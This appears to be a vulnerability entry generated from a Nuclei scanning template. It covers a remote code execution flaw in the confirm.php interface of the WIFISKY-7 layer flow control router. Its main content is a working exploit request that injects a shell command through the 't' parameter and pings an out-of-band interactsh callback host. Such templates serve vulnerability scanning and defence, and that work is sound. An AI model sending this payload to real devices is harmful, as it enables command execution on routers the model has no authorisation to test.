# Vulnerability: WIFISKY-7 Layer Flow Control Router - Remote Code Execution
**Classification:** WIFISKY
**Source:** Nuclei Template (`wifisky7-rce.yaml`)

## Description
There is an RCE vulnerability in the confirm.php interface of WIFISKY-7 layer flow control router

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/notice/confirm.php?t=%3bping+-c+3+{{interactsh-url}}
```

